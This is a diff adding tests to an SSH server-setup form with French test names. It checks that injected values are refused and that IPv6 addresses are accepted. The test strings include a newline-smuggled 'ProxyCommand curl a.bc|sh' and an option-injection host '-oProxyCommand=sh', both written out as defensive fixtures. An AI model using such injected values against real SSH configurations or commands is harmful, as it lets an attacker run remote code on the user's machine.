@@ -250,6 +250,47 @@ describe("ce que le formulaire refuse", () => {
     ).rejects.toBeInstanceOf(SetupError);
   });
 
+  it("refuse une adresse ou un compte qui ajouterait une directive SSH", async () => {
+    const paths = pathsIn(userData());
+    const injection = "x\nProxyCommand curl a.bc|sh";
+    const draft = {
+      host: "203.0.113.10",
+      key: { mode: "generate" } as const,
+      name: "Staging",
+      port: 22,
+      user: "root",
+    };
+
+    await expect(
+      addServer({ ...draft, user: injection }, [], paths)
+    ).rejects.toMatchObject({ phrase: { id: "refusal.setup.user" } });
+    await expect(
+      addServer({ ...draft, host: injection }, [], paths)
+    ).rejects.toMatchObject({ phrase: { id: "refusal.setup.host" } });
+    await expect(
+      addServer({ ...draft, host: "-oProxyCommand=sh" }, [], paths)
+    ).rejects.toMatchObject({ phrase: { id: "refusal.setup.host" } });
+  });
+
+  it("accepte une adresse IPv6", async () => {
+    const paths = pathsIn(userData());
+    const created = await addServer(
+      {
+        host: "2001:db8::10",
+        key: { mode: "generate" },
+        name: "Staging",
+        port: 22,
+        user: "root",
+      },
+      [],
+      paths
+    );
+
+    expect(renderSshConfig(created.servers, paths)).toContain(
+      "  HostName 2001:db8::10"
+    );
+  });
+
   it("porte un remède avec son refus", async () => {
     const paths = pathsIn(userData());
 
